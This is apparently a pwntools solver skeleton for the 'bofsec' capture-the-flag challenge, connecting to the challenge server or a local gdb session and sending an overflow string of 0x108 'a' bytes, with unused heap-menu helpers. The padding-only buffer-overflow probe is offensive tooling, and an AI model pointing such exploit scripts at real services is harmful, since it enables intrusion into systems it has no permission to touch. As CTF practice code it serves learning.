from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'bofsec.2023.ricercactf.com'
POST = 9001
#libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  # = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b *get_auth+108''')

def malloc(index,date,alignment,note):
    c.sendlineafter(b">",'1')
    c.sendlineafter(b"index ",index)
    c.sendlineafter(b"size ",date)
    c.sendlineafter(b"alignment ",alignment)
    c.sendlineafter(b"note: ",note)
    sleep(0.3)

def free(index):
    c.sendlineafter(b">",'2')
    c.sendlineafter(b"in?",index)
    sleep(0.3)
  
c.sendline((b'a'*0x108))
c.interactive()